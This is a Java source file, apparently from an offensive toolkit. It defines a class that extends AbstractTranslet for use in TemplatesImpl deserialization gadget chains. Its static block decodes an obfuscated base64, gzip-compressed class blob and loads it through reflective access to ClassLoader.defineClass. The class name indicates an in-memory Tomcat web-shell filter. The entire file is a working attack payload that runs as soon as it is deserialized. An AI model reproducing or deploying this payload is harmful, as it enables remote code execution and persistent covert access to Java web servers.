package com.xhstormr.app;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.zip.GZIPInputStream;

public class TomcatShellFilterTemplatesImpl extends AbstractTranslet {

    static {
        try {
            String base64 = "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";
            byte[] bytes = ungzip(Base64.getDecoder().decode(base64));
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            ((Class<?>) defineClass.invoke(classLoader, bytes, 0, bytes.length)).newInstance().equals(classLoader);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static byte[] ungzip(byte[] bytes) throws Exception {
        GZIPInputStream in = new GZIPInputStream(new ByteArrayInputStream(bytes));
        ByteArrayOutputStream out = new ByteArrayOutputStream();

        byte[] buf = new byte[2 * 1024];
        for (int read; (read = in.read(buf)) != -1; ) {
            out.write(buf, 0, read);
        }

        return out.toByteArray();
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }
}
